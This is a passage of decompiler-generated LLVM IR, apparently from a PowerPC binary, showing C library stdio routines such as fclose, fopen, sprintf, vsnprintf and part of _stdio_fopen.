  %v3_10009568 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_10030000.11 to i32), i32 -15708) to i32*), align 4
  %v2_1000956c = add i32 %v1_10009558, %v3_10009568
  %v3_1000956c = inttoptr i32 %v2_1000956c to i16*
  %v4_1000956c = load i16, i16* %v3_1000956c, align 2
  %v5_1000956c = sext i16 %v4_1000956c to i32
  ret i32 %v5_1000956c
}

define i32 @__GI_fclose(i16* %arg1) local_unnamed_addr {
entry:
  %cr7_eq.global-to-local = alloca i1, align 1
  %tmp = ptrtoint i16* %arg1 to i32
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  store i32 %tmp, i32* @r31, align 4
  %v2_10009588 = add i32 %tmp, 52
  %v3_10009588 = inttoptr i32 %v2_10009588 to i32*
  %v4_10009588 = load i32, i32* %v3_10009588, align 4
  store i32 %v4_10009588, i32* @r28, align 4
  %v3_1000958c = icmp eq i32 %v4_10009588, 0
  store i1 %v3_1000958c, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_1000958c, label %dec_label_pc_10009594, label %dec_label_pc_100095b4

dec_label_pc_10009594:                            ; preds = %entry
  %v2_10009594 = add i32 %tmp, 56
  %v4_100095a8 = call i32 @__pthread_cleanup_push_defer(i32* nonnull %stack_var_-56, i32 268461856, i32 %v2_10009594)
  store i32 268473780, i32* @lr, align 4
  %v1_100095b0 = call i32 @pthread_mutex_lock(i32 %v2_10009594)
  %v0_100095b4.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_100095b4

dec_label_pc_100095b4:                            ; preds = %entry, %dec_label_pc_10009594
  %v0_100095c4 = phi i32 [ %tmp, %entry ], [ %v0_100095b4.pre, %dec_label_pc_10009594 ]
  %v1_100095b4 = inttoptr i32 %v0_100095c4 to i16*
  %v2_100095b4 = load i16, i16* %v1_100095b4, align 2
  %v3_100095b4 = zext i16 %v2_100095b4 to i32
  store i32 0, i32* @r27, align 4
  %v1_100095bc = and i32 %v3_100095b4, 64
  %v3_100095bc = icmp eq i32 %v1_100095bc, 0
  br i1 %v3_100095bc, label %dec_label_pc_100095d0, label %dec_label_pc_100095c4

dec_label_pc_100095c4:                            ; preds = %dec_label_pc_100095b4
  store i32 268473804, i32* @lr, align 4
  %v4_100095c8 = call i32 @fflush_unlocked(i16* %v1_100095b4, i32 %v1_100095bc)
  store i32 %v4_100095c8, i32* @r27, align 4
  %v0_100095d0.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_100095d0

dec_label_pc_100095d0:                            ; preds = %dec_label_pc_100095b4, %dec_label_pc_100095c4
  %v0_100095d0 = phi i32 [ %v0_100095c4, %dec_label_pc_100095b4 ], [ %v0_100095d0.pre, %dec_label_pc_100095c4 ]
  %v1_100095d0 = add i32 %v0_100095d0, 4
  %v2_100095d0 = inttoptr i32 %v1_100095d0 to i32*
  %v3_100095d0 = load i32, i32* %v2_100095d0, align 4
  store i32 268473816, i32* @lr, align 4
  %v1_100095d4 = call i32 @__libc_close(i32 %v3_100095d0)
  %v3_100095d8 = icmp eq i32 %v1_100095d4, 0
  store i1 %v3_100095d8, i1* %cr7_eq.global-to-local, align 1
  %tmp8 = icmp sgt i32 %v1_100095d4, -1
  br i1 %tmp8, label %dec_label_pc_100095e4, label %dec_label_pc_100095e0

dec_label_pc_100095e0:                            ; preds = %dec_label_pc_100095d0
  store i32 -1, i32* @r27, align 4
  br label %dec_label_pc_100095e4

dec_label_pc_100095e4:                            ; preds = %dec_label_pc_100095d0, %dec_label_pc_100095e0
  store i32 268461856, i32* @r26, align 4
  store i32 ptrtoint (i32* @global_var_1002bf18.278 to i32), i32* @r29, align 4
  %v1_100095f8 = load i32, i32* @r31, align 4
  %v2_100095f8 = add i32 %v1_100095f8, 4
  %v3_100095f8 = inttoptr i32 %v2_100095f8 to i32*
  store i32 -1, i32* %v3_100095f8, align 4
  %v2_100095fc = ptrtoint i32* %stack_var_-40 to i32
  %v0_10009600 = load i32, i32* @r26, align 4
  %v0_10009604 = load i32, i32* @r29, align 4
  %v4_1000960c = call i32 @__pthread_cleanup_push_defer(i32* nonnull %stack_var_-40, i32 %v0_10009600, i32 %v0_10009604)
  %v0_10009610 = load i32, i32* @r29, align 4
  store i32 268473880, i32* @lr, align 4
  %v1_10009614 = call i32 @pthread_mutex_lock(i32 %v0_10009610)
  %v3_1000961c = load i32, i32* @global_var_1002c380.279, align 4
  store i32 %v2_100095fc, i32* @r3, align 4
  store i32 1, i32* @r4, align 4
  %v1_10009628 = add i32 %v3_1000961c, 1
  store i32 %v1_10009628, i32* @global_var_1002c380.279, align 4
  store i32 268473908, i32* @lr, align 4
  %v0_10009630 = call i32 @__pthread_cleanup_pop_restore()
  %v0_10009634 = load i32, i32* @r31, align 4
  %v1_10009634 = inttoptr i32 %v0_10009634 to i16*
  %v2_10009634 = load i16, i16* %v1_10009634, align 2
  %v3_10009634 = zext i16 %v2_10009634 to i32
  %v0_10009638 = load i32, i32* @r28, align 4
  %v3_10009638 = icmp eq i32 %v0_10009638, 0
  store i1 %v3_10009638, i1* %cr7_eq.global-to-local, align 1
  %v1_1000963c = call i32 @__asm_rlwinm(i32 %v3_10009634, i32 0, i32 17, i32 18)
  %v1_10009644 = or i32 %v1_1000963c, 48
  %v1_10009648 = trunc i32 %v1_10009644 to i16
  %v2_10009648 = load i32, i32* @r31, align 4
  %v3_10009648 = inttoptr i32 %v2_10009648 to i16*
  store i16 %v1_10009648, i16* %v3_10009648, align 2
  %v0_1000964c = load i1, i1* %cr7_eq.global-to-local, align 1
  br i1 %v0_1000964c, label %dec_label_pc_10009650, label %dec_label_pc_1000965c

dec_label_pc_10009650:                            ; preds = %dec_label_pc_100095e4
  %v2_10009650 = ptrtoint i32* %stack_var_-56 to i32
  store i32 %v2_10009650, i32* @r3, align 4
  store i32 1, i32* @r4, align 4
  store i32 268473948, i32* @lr, align 4
  %v0_10009658 = call i32 @__pthread_cleanup_pop_restore()
  br label %dec_label_pc_1000965c

dec_label_pc_1000965c:                            ; preds = %dec_label_pc_100095e4, %dec_label_pc_10009650
  %v0_1000965c = load i32, i32* @r31, align 4
  %v1_1000965c = inttoptr i32 %v0_1000965c to i16*
  %v2_1000965c = load i16, i16* %v1_1000965c, align 2
  %v1_10009660 = and i16 %v2_1000965c, 16384
  %v3_10009660 = icmp eq i16 %v1_10009660, 0
  br i1 %v3_10009660, label %dec_label_pc_10009670, label %dec_label_pc_10009668

dec_label_pc_10009668:                            ; preds = %dec_label_pc_1000965c
  %v1_10009668 = add i32 %v0_1000965c, 8
  %v2_10009668 = inttoptr i32 %v1_10009668 to i32*
  %v3_10009668 = load i32, i32* %v2_10009668, align 4
  store i32 %v3_10009668, i32* @r3, align 4
  store i32 268473968, i32* @lr, align 4
  %v0_1000966c = call i32 @free()
  br label %dec_label_pc_10009670

dec_label_pc_10009670:                            ; preds = %dec_label_pc_1000965c, %dec_label_pc_10009668
  %v0_10009670 = load i32, i32* @r29, align 4
  %v0_10009674 = load i32, i32* @r26, align 4
  %v4_1000967c = call i32 @__pthread_cleanup_push_defer(i32* nonnull %stack_var_-40, i32 %v0_10009674, i32 %v0_10009670)
  %v0_10009680 = load i32, i32* @r29, align 4
  store i32 268473992, i32* @lr, align 4
  %v1_10009684 = call i32 @pthread_mutex_lock(i32 %v0_10009680)
  %v3_1000968c = load i16*, i16** @global_var_1002c384.280, align 4
  %v4_1000968c = ptrtoint i16* %v3_1000968c to i32
  store i32 %v2_100095fc, i32* @r3, align 4
  store i32 1, i32* @r4, align 4
  %v1_10009698 = add i32 %v4_1000968c, 1
  %v4_1000969c = inttoptr i32 %v1_10009698 to i16*
  store i16* %v4_1000969c, i16** @global_var_1002c384.280, align 4
  store i32 ptrtoint (i32* @global_var_100096a4.281 to i32), i32* @lr, align 4
  %v0_100096a0 = call i32 @__pthread_cleanup_pop_restore()
  store i32 268474024, i32* @lr, align 4
  %v0_100096a4 = call i32 @_stdio_openlist_dec_use()
  %v0_100096ac = load i32, i32* @r27, align 4
  ret i32 %v0_100096ac

; uselistorder directives
  uselistorder i32* %stack_var_-56, { 1, 0 }
  uselistorder i32 %tmp, { 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_10009670, { 1, 0 }
  uselistorder label %dec_label_pc_1000965c, { 1, 0 }
  uselistorder label %dec_label_pc_100095e4, { 1, 0 }
  uselistorder label %dec_label_pc_100095d0, { 1, 0 }
  uselistorder label %dec_label_pc_100095b4, { 1, 0 }
}

define i32 @__GI_fopen(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 0, i32* @r5, align 4
  store i32 -1, i32* @r6, align 4
  %v3_100096c8 = call i32 @_stdio_fopen(i32 0, i8* inttoptr (i32 -1 to i8*))
  ret i32 %v3_100096c8
}

define i32 @vsprintf(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  store i32 %arg2, i32* @r6, align 4
  store i32 %arg1, i32* @r5, align 4
  store i32 -1, i32* @r4, align 4
  %v0_100096d8 = call i32 @__GI_vsnprintf()
  ret i32 %v0_100096d8
}

define i32 @sprintf(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-96 = alloca i32, align 4
  %stack_var_-104 = alloca i32, align 4
  store i32 -1, i32* @r4, align 4
  store i32 %arg1, i32* @r5, align 4
  %v2_100096fc = ptrtoint i32* %stack_var_-104 to i32
  store i32 %v2_100096fc, i32* @r6, align 4
  store i32 2, i32* %stack_var_-104, align 4
  %v2_1000974c = ptrtoint i32* %stack_var_-96 to i32
  store i32 %v2_1000974c, i32* %stack_var_-96, align 4
  store i32 268474200, i32* @lr, align 4
  %v0_10009754 = call i32 @__GI_vsnprintf()
  ret i32 %v0_10009754
}

define i32 @__GI_vsnprintf() local_unnamed_addr {
entry:
  %r29.global-to-local = alloca i32, align 4
  %r30.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  %stack_var_-104 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %v0_10009774 = load i32, i32* @r4, align 4
  store i32 %v0_10009774, i32* @r27, align 4
  store i32 208, i32* %stack_var_-104, align 4
  %v0_10009790 = load i32, i32* @r3, align 4
  %v1_10009790 = sub i32 -1, %v0_10009790
  store i32 %v1_10009790, i32* %r30.global-to-local, align 4
  store i32 0, i32* @r26, align 4
  store i32 %v0_10009790, i32* %r31.global-to-local, align 4
  %v2_100097a4 = ptrtoint i32* %stack_var_-48 to i32
  store i32 %v2_100097a4, i32* @r3, align 4
  %v0_100097a8 = load i32, i32* @r5, align 4
  store i32 %v0_100097a8, i32* %r29.global-to-local, align 4
  %v0_100097ac = load i32, i32* @r6, align 4
  store i32 %v0_100097ac, i32* @r28, align 4
  store i32 268474300, i32* @lr, align 4
  %v0_100097b8 = call i32 @__stdio_init_mutex()
  %v0_100097bc = load i32, i32* %r30.global-to-local, align 4
  %v1_100097bc = load i32, i32* @r27, align 4
  %v3_100097bc = icmp ugt i32 %v0_100097bc, %v1_100097bc
  %v0_100097c0 = load i32, i32* %r29.global-to-local, align 4
  store i32 %v0_100097c0, i32* @r4, align 4
  %v0_100097c4 = load i32, i32* @r28, align 4
  store i32 %v0_100097c4, i32* @r5, align 4
  %v2_100097c8 = ptrtoint i32* %stack_var_-104 to i32
  store i32 %v2_100097c8, i32* @r3, align 4
  br i1 %v3_100097bc, label %dec_label_pc_100097d4, label %dec_label_pc_100097d8

dec_label_pc_100097d4:                            ; preds = %entry
  store i32 %v1_100097bc, i32* %r30.global-to-local, align 4
  br label %dec_label_pc_100097d8

dec_label_pc_100097d8:                            ; preds = %entry, %dec_label_pc_100097d4
  %v1_100097d8 = phi i32 [ %v0_100097bc, %entry ], [ %v1_100097bc, %dec_label_pc_100097d4 ]
  %v0_100097d8 = load i32, i32* %r31.global-to-local, align 4
  store i32 268474360, i32* @lr, align 4
  %v0_100097f4 = call i32 @_vfprintf_internal()
  %v0_100097f8 = load i32, i32* @r30, align 4
  %v3_100097f8 = icmp eq i32 %v0_100097f8, 0
  br i1 %v3_100097f8, label %dec_label_pc_10009820, label %dec_label_pc_10009800

dec_label_pc_10009800:                            ; preds = %dec_label_pc_100097d8
  %v4_1000980c = icmp eq i32 %v1_100097d8, 0
  %v1_10009808 = sext i1 %v4_1000980c to i32
  %v0_10009814.v0_100097d8 = add i32 %v0_100097d8, %v1_10009808
  %stack_var_-88.0 = inttoptr i32 %v0_10009814.v0_100097d8 to i8*
  %v0_1000981c = load i32, i32* @r26, align 4
  %v1_1000981c = trunc i32 %v0_1000981c to i8
  store i8 %v1_1000981c, i8* %stack_var_-88.0, align 1
  br label %dec_label_pc_10009820

dec_label_pc_10009820:                            ; preds = %dec_label_pc_100097d8, %dec_label_pc_10009800
  ret i32 %v0_100097f4

; uselistorder directives
  uselistorder i32 %v0_10009790, { 1, 0 }
  uselistorder i32* %stack_var_-104, { 1, 0 }
  uselistorder label %dec_label_pc_10009820, { 1, 0 }
  uselistorder label %dec_label_pc_100097d8, { 1, 0 }
}

define i32 @_stdio_fopen(i32 %arg1, i8* %arg2) local_unnamed_addr {
entry:
  %cr0_eq.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r29.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg2 to i32
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %v0_10009834 = load i32, i32* @lr, align 4
  store i32 %v0_10009834, i32* %r0.global-to-local, align 4
  store i32 %arg1, i32* @r27, align 4
  %v0_10009848 = load i32, i32* @r5, align 4
  store i32 %v0_10009848, i32* @r31, align 4
  %v0_1000984c = load i32, i32* @r6, align 4
  store i32 %v0_1000984c, i32* @r29, align 4
  %v3_10009850 = load i8, i8* %arg2, align 1
  %v4_10009850 = zext i8 %v3_10009850 to i32
  store i32 %v4_10009850, i32* %r0.global-to-local, align 4
  %v3_10009854 = icmp eq i8 %v3_10009850, 114
  br i1 %v3_10009854, label %dec_label_pc_100098a0, label %dec_label_pc_1000985c

dec_label_pc_1000985c:                            ; preds = %entry
  %v3_1000985c = icmp eq i8 %v3_10009850, 119
  store i32 577, i32* @r28, align 4
  br i1 %v3_1000985c, label %dec_label_pc_100098a4, label %dec_label_pc_10009868

dec_label_pc_10009868:                            ; preds = %dec_label_pc_1000985c
  %v3_10009868 = icmp eq i8 %v3_10009850, 97
  store i32 1089, i32* @r28, align 4
  br i1 %v3_10009868, label %dec_label_pc_100098a4, label %dec_label_pc_10009874

dec_label_pc_10009874:                            ; preds = %dec_label_pc_10009934, %dec_label_pc_10009904, %dec_label_pc_10009868
  %v0_10009874 = call i32 @__errno_location()
  %v0_10009878 = load i32, i32* @r31, align 4
  %v3_10009878 = icmp eq i32 %v0_10009878, 0
  store i32 22, i32* %r0.global-to-local, align 4
  %v2_10009880 = inttoptr i32 %v0_10009874 to i32*
  store i32 22, i32* %v2_10009880, align 4
  br i1 %v3_10009878, label %dec_label_pc_10009ad4, label %dec_label_pc_10009888

dec_label_pc_10009888:                            ; preds = %dec_label_pc_10009968, %dec_label_pc_10009874
  %v0_10009888 = load i32, i32* @r31, align 4
  %v1_10009888 = inttoptr i32 %v0_10009888 to i16*
  %v2_10009888 = load i16, i16* %v1_10009888, align 2
  %v3_10009888 = zext i16 %v2_10009888 to i32
  store i32 %v3_10009888, i32* %r0.global-to-local, align 4
  %v1_1000988c = and i32 %v3_10009888, 8192
  store i32 %v1_1000988c, i32* %r9.global-to-local, align 4
  %v3_1000988c = icmp eq i32 %v1_1000988c, 0
  store i1 %v3_1000988c, i1* %cr0_eq.global-to-local, align 1
  br i1 %v3_1000988c, label %dec_label_pc_10009ad4, label %dec_label_pc_10009894

dec_label_pc_10009894:                            ; preds = %dec_label_pc_10009888
  store i32 %v0_10009888, i32* @r3, align 4
  store i32 ptrtoint (i32* @global_var_1000989c.282 to i32), i32* @lr, align 4
  %v0_10009898 = call i32 @free()
  br label %dec_label_pc_10009ad4

dec_label_pc_100098a0:                            ; preds = %entry
  store i32 0, i32* @r28, align 4
  br label %dec_label_pc_100098a4

dec_label_pc_100098a4:                            ; preds = %dec_label_pc_10009868, %dec_label_pc_1000985c, %dec_label_pc_100098a0
  %v0_100098c4 = phi i32 [ 1089, %dec_label_pc_10009868 ], [ 577, %dec_label_pc_1000985c ], [ 1, %dec_label_pc_100098a0 ]
  %v2_100098a4 = add i32 %tmp, 1
  %v3_100098a4 = inttoptr i32 %v2_100098a4 to i8*
  %v4_100098a4 = load i8, i8* %v3_100098a4, align 1
  %v5_100098a4 = zext i8 %v4_100098a4 to i32
  store i32 %v5_100098a4, i32* %r0.global-to-local, align 4
  %v3_100098ac = icmp eq i8 %v4_100098a4, 98
  br i1 %v3_100098ac, label %dec_label_pc_100098b8, label %dec_label_pc_100098b4

dec_label_pc_100098b4:                            ; preds = %dec_label_pc_100098a4
  br label %dec_label_pc_100098b8

dec_label_pc_100098b8:                            ; preds = %dec_label_pc_100098a4, %dec_label_pc_100098b4
  %storemerge = phi i32 [ %tmp, %dec_label_pc_100098b4 ], [ %v2_100098a4, %dec_label_pc_100098a4 ]
  %v0_100098b8 = phi i32 [ %tmp, %dec_label_pc_100098b4 ], [ %v2_100098a4, %dec_label_pc_100098a4 ]
  store i32 %storemerge, i32* %r9.global-to-local, align 4
  %v1_100098b8 = add i32 %v0_100098b8, 1
  %v2_100098b8 = inttoptr i32 %v1_100098b8 to i8*
  %v3_100098b8 = load i8, i8* %v2_100098b8, align 1
  %v4_100098b8 = zext i8 %v3_100098b8 to i32
  store i32 %v4_100098b8, i32* %r0.global-to-local, align 4
  %v3_100098bc = icmp eq i8 %v3_100098b8, 43
  br i1 %v3_100098bc, label %dec_label_pc_100098c4, label %dec_label_pc_100098cc

dec_label_pc_100098c4:                            ; preds = %dec_label_pc_100098b8
  store i32 %v0_100098c4, i32* %r9.global-to-local, align 4
  %v1_100098c8 = add nuw nsw i32 %v0_100098c4, 1
  store i32 %v1_100098c8, i32* @r28, align 4
  br label %dec_label_pc_100098cc

dec_label_pc_100098cc:                            ; preds = %dec_label_pc_100098b8, %dec_label_pc_100098c4
  %v3_100098cc = icmp eq i32 %v0_10009848, 0
  br i1 %v3_100098cc, label %dec_label_pc_100098d4, label %dec_label_pc_100098fc

dec_label_pc_100098d4:                            ; preds = %dec_label_pc_100098cc
  store i32 80, i32* @r3, align 4
  store i32 268474588, i32* @lr, align 4
  %v0_100098d8 = call i32 @malloc()
  store i32 %v0_100098d8, i32* @r31, align 4
  %v4_100098dc = icmp eq i32 %v0_100098d8, 0
  store i1 %v4_100098dc, i1* %cr0_eq.global-to-local, align 1
  br i1 %v4_100098dc, label %dec_label_pc_10009ad8, label %dec_label_pc_100098e4

dec_label_pc_100098e4:                            ; preds = %dec_label_pc_100098d4
  %v1_100098e8 = add i32 %v0_100098d8, 56
  store i32 %v1_100098e8, i32* @r3, align 4
  %v3_100098ec = inttoptr i32 %v0_100098d8 to i16*
  store i16 8192, i16* %v3_100098ec, align 2
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_100098f4 = load i32, i32* @r31, align 4
  %v2_100098f4 = add i32 %v1_100098f4, 8
  %v3_100098f4 = inttoptr i32 %v2_100098f4 to i32*
  store i32 0, i32* %v3_100098f4, align 4
  store i32 268474620, i32* @lr, align 4
  %v0_100098f8 = call i32 @__stdio_init_mutex()
  %v0_100098fc.pre = load i32, i32* @r29, align 4
  br label %dec_label_pc_100098fc

dec_label_pc_100098fc:                            ; preds = %dec_label_pc_100098cc, %dec_label_pc_100098e4
  %v0_1000995c = phi i32 [ %v0_1000984c, %dec_label_pc_100098cc ], [ %v0_100098fc.pre, %dec_label_pc_100098e4 ]
  %v1_100098fc = icmp slt i32 %v0_1000995c, 0
  br i1 %v1_100098fc, label %dec_label_pc_1000995c, label %dec_label_pc_10009904

dec_label_pc_10009904:                            ; preds = %dec_label_pc_100098fc
  %v1_10009908 = add i32 %arg1, 1
  store i32 %v1_10009908, i32* %r0.global-to-local, align 4
  store i32 65539, i32* %r9.global-to-local, align 4
  %v1_10009910 = load i32, i32* @r31, align 4
  %v2_10009910 = add i32 %v1_10009910, 4
  %v3_10009910 = inttoptr i32 %v2_10009910 to i32*
  store i32 %v0_1000995c, i32* %v3_10009910, align 4
  %v0_10009914 = load i32, i32* @r28, align 4
  %v1_10009914 = load i32, i32* %r9.global-to-local, align 4
  %v2_10009914 = and i32 %v1_10009914, %v0_10009914
  %v1_10009918 = add i32 %v2_10009914, 1
  store i32 %v1_10009918, i32* %r9.global-to-local, align 4
  %v1_1000991c = load i32, i32* %r0.global-to-local, align 4
  %v2_1000991c = and i32 %v1_1000991c, %v1_10009918
  store i32 %v2_1000991c, i32* %r0.global-to-local, align 4
  %v4_10009920 = icmp eq i32 %v2_1000991c, %v1_10009918
  br i1 %v4_10009920, label %dec_label_pc_10009928, label %dec_label_pc_10009874

dec_label_pc_10009928:                            ; preds = %dec_label_pc_10009904
  %v2_10009928 = sub i32 -1, %arg1
  %v3_10009928 = and i32 %v0_10009914, %v2_10009928
  store i32 %v3_10009928, i32* %r0.global-to-local, align 4
  %v1_1000992c = and i32 %v3_10009928, 1024
  store i32 %v1_1000992c, i32* %r9.global-to-local, align 4
  %v3_1000992c = icmp eq i32 %v1_1000992c, 0
  store i1 %v3_1000992c, i1* %cr0_eq.global-to-local, align 1
  br i1 %v3_1000992c, label %dec_label_pc_10009950, label %dec_label_pc_10009934

dec_label_pc_10009934:                            ; preds = %dec_label_pc_10009928
  %v0_10009934 = load i32, i32* @r29, align 4
  store i32 268474696, i32* @lr, align 4
  %v2_10009944 = call i32 @__libc_fcntl(i32 %v0_10009934, i32 4)
  %v3_10009948 = icmp eq i32 %v2_10009944, 0
  br i1 %v3_10009948, label %dec_label_pc_10009950, label %dec_label_pc_10009874

dec_label_pc_10009950:                            ; preds = %dec_label_pc_10009934, %dec_label_pc_10009928
  %v1_10009950 = call i32 @__asm_rlwinm(i32 %arg1, i32 0, i32 15, i32 15)
  store i32 %v1_10009950, i32* %r0.global-to-local, align 4
  %v0_10009954 = load i32, i32* @r28, align 4
  %v2_10009954 = or i32 %v0_10009954, %v1_10009950
  store i32 %v2_10009954, i32* @r28, align 4
  br label %dec_label_pc_10009988

dec_label_pc_1000995c:                            ; preds = %dec_label_pc_100098fc
  %v3_1000995c = icmp eq i32 %v0_1000995c, -1
  %v0_1000996c.pre = load i32, i32* @r28, align 4
  br i1 %v3_1000995c, label %dec_label_pc_10009968, label %dec_label_pc_10009964

dec_label_pc_10009964:                            ; preds = %dec_label_pc_1000995c
  %v1_10009964 = or i32 %v0_1000996c.pre, 65536
  store i32 %v1_10009964, i32* @r28, align 4
  br label %dec_label_pc_10009968

dec_label_pc_10009968:                            ; preds = %dec_label_pc_1000995c, %dec_label_pc_10009964
  %v0_1000996c = phi i32 [ %v1_10009964, %dec_label_pc_10009964 ], [ %v0_1000996c.pre, %dec_label_pc_1000995c ]
  store i32 %v0_1000996c, i32* @r4, align 4
  store i32 438, i32* @r5, align 4
  store i32 268474748, i32* @lr, align 4
  %v0_10009978 = call i32 @__libc_open()
  %v1_1000997c = icmp slt i32 %v0_10009978, 0
  %v1_10009980 = load i32, i32* @r31, align 4
  %v2_10009980 = add i32 %v1_10009980, 4
  %v3_10009980 = inttoptr i32 %v2_10009980 to i32*
  store i32 %v0_10009978, i32* %v3_10009980, align 4
  br i1 %v1_1000997c, label %dec_label_pc_10009888, label %dec_label_pc_10009968.dec_label_pc_10009988_crit_edge

dec_label_pc_10009968.dec_label_pc_10009988_crit_edge: ; preds = %dec_label_pc_10009968
  %v0_1000998c.pre = load i32, i32* @r28, align 4
  br label %dec_label_pc_10009988

dec_label_pc_10009988:                            ; preds = %dec_label_pc_10009968.dec_label_pc_10009988_crit_edge, %dec_label_pc_10009950
  %v0_1000998c = phi i32 [ %v0_1000998c.pre, %dec_label_pc_10009968.dec_label_pc_10009988_crit_edge ], [ %v2_10009954, %dec_label_pc_10009950 ]
  %v0_10009988 = load i32, i32* @r31, align 4
  %v1_10009988 = inttoptr i32 %v0_10009988 to i16*
  %v2_10009988 = load i16, i16* %v1_10009988, align 2
  %v3_10009988 = zext i16 %v2_10009988 to i32
  store i32 %v3_10009988, i32* %r0.global-to-local, align 4
  %v1_1000998c = urem i32 %v0_1000998c, 4
  store i32 %v1_1000998c, i32* %r29.global-to-local, align 4
  %v1_10009990 = call i32 @__asm_rlwinm(i32 %v0_1000998c, i32 0, i32 21, i32 21)
  %v1_10009994 = add nuw nsw i32 %v1_1000998c, 1
  store i32 %v1_10009994, i32* %r29.global-to-local, align 4
  %v1_10009998 = call i32 @__asm_rlwinm(i32 %v3_10009988, i32 0, i32 18, i32 18)
  store i32 %v1_10009998, i32* %r0.global-to-local, align 4
  %v1_1000999c = xor i32 %v1_10009994, 3
  store i32 %v1_1000999c, i32* %r29.global-to-local, align 4
  %v1_100099a0 = urem i32 %v1_10009998, 65536
  store i32 %v1_100099a0, i32* %r9.global-to-local, align 4
  %v0_100099a4 = load i32, i32* @r28, align 4
  %v1_100099a4 = call i32 @__asm_rlwinm(i32 %v0_100099a4, i32 31, i32 16, i32 16)
  %v2_100099a8 = or i32 %v1_100099a4, %v1_10009990
  store i32 %v2_100099a8, i32* %r0.global-to-local, align 4
  %v0_100099ac = load i32, i32* %r29.global-to-local, align 4
  %v1_100099ac = mul i32 %v0_100099ac, 16
  %v0_100099b0 = load i32, i32* %r9.global-to-local, align 4
  %v2_100099b0 = or i32 %v0_100099b0, %v2_100099a8
  store i32 %v2_100099b0, i32* %r9.global-to-local, align 4
  %v2_100099b4 = or i32 %v2_100099b0, %v1_100099ac
  store i32 %v2_100099b4, i32* @r29, align 4
  %v1_100099b8 = trunc i32 %v2_100099b4 to i16
  %v2_100099b8 = load i32, i32* @r31, align 4
  %v3_100099b8 = inttoptr i32 %v2_100099b8 to i16*
  store i16 %v1_100099b8, i16* %v3_100099b8, align 2
  %v0_100099bc = call i32 @__errno_location()
  store i32 %v0_100099bc, i32* @r28, align 4
  %v0_100099c4 = load i32, i32* @r31, align 4
  %v1_100099c4 = add i32 %v0_100099c4, 4
  %v2_100099c4 = inttoptr i32 %v1_100099c4 to i32*
  %v3_100099c4 = load i32, i32* %v2_100099c4, align 4
  %v1_100099c8 = inttoptr i32 %v0_100099bc to i32*
  %v2_100099c8 = load i32, i32* %v1_100099c8, align 4
  store i32 %v2_100099c8, i32* @r27, align 4
  store i32 268474832, i32* @lr, align 4
  %v1_100099cc = call i32 @isatty(i32 %v3_100099c4)
  %v1_100099d0 = mul i32 %v1_100099cc, 256
  %v0_100099d4 = load i32, i32* @r29, align 4
  %v2_100099d4 = or i32 %v0_100099d4, %v1_100099d0
  store i32 %v2_100099d4, i32* @r29, align 4
  %v1_100099d8 = trunc i32 %v2_100099d4 to i16
  %v2_100099d8 = load i32, i32* @r31, align 4
  %v3_100099d8 = inttoptr i32 %v2_100099d8 to i16*
  store i16 %v1_100099d8, i16* %v3_100099d8, align 2
  %v0_100099dc = load i32, i32* @r27, align 4
  %v1_100099dc = load i32, i32* @r28, align 4
  %v2_100099dc = inttoptr i32 %v1_100099dc to i32*
  store i32 %v0_100099dc, i32* %v2_100099dc, align 4
  %v0_100099e0 = load i32, i32* @r31, align 4
  %v1_100099e0 = add i32 %v0_100099e0, 8
  %v2_100099e0 = inttoptr i32 %v1_100099e0 to i32*
  %v3_100099e0 = load i32, i32* %v2_100099e0, align 4
  store i32 %v3_100099e0, i32* %r0.global-to-local, align 4
  %v3_100099e4 = icmp eq i32 %v3_100099e0, 0
  br i1 %v3_100099e4, label %dec_label_pc_100099ec, label %dec_label_pc_10009a1c

dec_label_pc_100099ec:                            ; preds = %dec_label_pc_10009988
  store i32 4096, i32* @r3, align 4
  store i32 268474868, i32* @lr, align 4
  %v0_100099f0 = call i32 @malloc()
  %v3_100099f4 = icmp eq i32 %v0_100099f0, 0
  %v1_100099f8 = load i32, i32* @r31, align 4
  %v2_100099f8 = add i32 %v1_100099f8, 8
  %v3_100099f8 = inttoptr i32 %v2_100099f8 to i32*
  store i32 %v0_100099f0, i32* %v3_100099f8, align 4
  %v1_10009a18 = load i32, i32* @r31, align 4
  br i1 %v3_100099f4, label %dec_label_pc_10009a18, label %dec_label_pc_10009a00

dec_label_pc_10009a00:                            ; preds = %dec_label_pc_100099ec
  %v1_10009a00 = inttoptr i32 %v1_10009a18 to i16*
  %v2_10009a00 = load i16, i16* %v1_10009a00, align 2
  %v3_10009a00 = zext i16 %v2_10009a00 to i32
  store i32 %v3_10009a00, i32* %r0.global-to-local, align 4
  %v1_10009a04 = add i32 %v0_100099f0, 4096
  store i32 %v1_10009a04, i32* %r9.global-to-local, align 4
  %v2_10009a08 = add i32 %v1_10009a18, 12
  %v3_10009a08 = inttoptr i32 %v2_10009a08 to i32*
  store i32 %v1_10009a04, i32* %v3_10009a08, align 4
  %v0_10009a0c = load i32, i32* %r0.global-to-local, align 4
  %v1_10009a0c = or i32 %v0_10009a0c, 16384
  store i32 %v1_10009a0c, i32* %r0.global-to-local, align 4
  %v1_10009a10 = trunc i32 %v1_10009a0c to i16
  %v2_10009a10 = load i32, i32* @r31, align 4
  %v3_10009a10 = inttoptr i32 %v2_10009a10 to i16*
  store i16 %v1_10009a10, i16* %v3_10009a10, align 2
  br label %dec_label_pc_10009a1c

dec_label_pc_10009a18:                            ; preds = %dec_label_pc_100099ec
  %v2_10009a18 = add i32 %v1_10009a18, 12
  %v3_10009a18 = inttoptr i32 %v2_10009a18 to i32*
  store i32 0, i32* %v3_10009a18, align 4
  br label %dec_label_pc_10009a1c

